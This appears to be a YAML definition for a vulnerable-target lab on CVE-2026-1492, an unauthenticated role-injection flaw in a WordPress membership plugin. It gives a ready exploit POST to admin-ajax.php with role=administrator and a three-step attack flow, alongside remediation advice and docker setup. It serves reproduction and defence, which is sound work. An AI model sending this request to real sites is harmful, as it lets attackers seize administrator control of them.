id: vt-2026-1492

info:
  name: "WordPress User Registration & Membership - Unauthenticated Privilege Escalation"
  author: omarkurt
  description: |
    The User Registration & Membership plugin for WordPress versions up to and including
    5.1.2 is vulnerable to unauthenticated privilege escalation. The plugin accepts a
    user-supplied role parameter during membership registration via the
    user_registration_membership_register_member AJAX action without enforcing a server-side
    allowlist of permissible roles. This allows unauthenticated attackers to create
    administrator accounts by injecting role=administrator in the membership registration
    request, leading to complete site takeover. Wordfence blocked 74 distinct attack
    attempts within 24 hours of disclosure.
  type: CVE
  targets:
    - wordpress
  cve: CVE-2026-1492
  cwe: CWE-269
  cvss:
    score: 9.8
    severity: critical
    metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  affected_versions:
    - "<= 5.1.2"
  fixed_version: "5.1.3"
  tags:
    - privilege-escalation
    - unauthenticated
    - wordpress
    - wp-plugin
    - cve-2026
  references:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-1492
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/7e9fec92-f471-4ce9-9138-1c58ad658da2
    - https://plugins.trac.wordpress.org/changeset/3469042/user-registration

vulnerabilities:
  - id: membership_role_injection
    name: "Unauthenticated Role Injection via Membership Registration AJAX"
    description: |
      The user_registration_membership_register_member AJAX action accepts a role parameter
      from unauthenticated users without server-side validation. An attacker registers a
      standard account first, then calls the membership registration endpoint with
      role=administrator to escalate the newly created account to admin privileges.
    endpoint: /wp-admin/admin-ajax.php
    method: POST
    param: role
    request: |
      POST /wp-admin/admin-ajax.php HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/json

      {"action":"user_registration_membership_register_member","membership":"1","payment_method":"free","username":"attacker","role":"administrator"}
    response: |
      HTTP/1.1 200 OK
      Content-Type: application/json

technical: |
  The vulnerability exists in the membership registration handler. When a user registers
  through the membership flow, the plugin processes the registration via the
  user_registration_membership_register_member AJAX action. The handler reads the role
  parameter directly from user input and passes it to wp_update_user() without checking
  it against an allowlist of permitted roles. The fix in version 5.1.3 enforces server-side
  role validation by comparing the supplied role against the membership plan's configured
  allowed role.

  Attack flow:
  1. GET /membership-registration/ - extract nonces and form_id
  2. POST admin-ajax.php action=user_registration_user_form_submit - register user
  3. POST admin-ajax.php action=user_registration_membership_register_member with
     role=administrator - escalate to admin

impact: |
  Unauthenticated attackers can create administrator accounts on any WordPress site
  running the vulnerable plugin version. With admin access, attackers can install
  backdoors, modify content, steal user data, deploy malware, and fully compromise
  the site. The vulnerability is actively exploited in the wild.

remediation:
  - "Update User Registration & Membership plugin to version 5.1.3 or later"
  - "Audit existing user accounts for unauthorized administrator roles"
  - "Monitor wp-admin/admin-ajax.php logs for membership_register_member requests"

poc:
  nuclei:
    - "vt-2026-1492.nuclei.yaml"

providers:
  docker-compose:
    path: "docker-compose.yaml"

post-install:
  - "Wait ~60 seconds for WordPress and plugin setup to complete"
  - "Access WordPress at http://localhost:9090"
  - "Admin credentials: admin / admin123"
  - "Plugin User Registration v5.1.2 is auto-installed and activated"
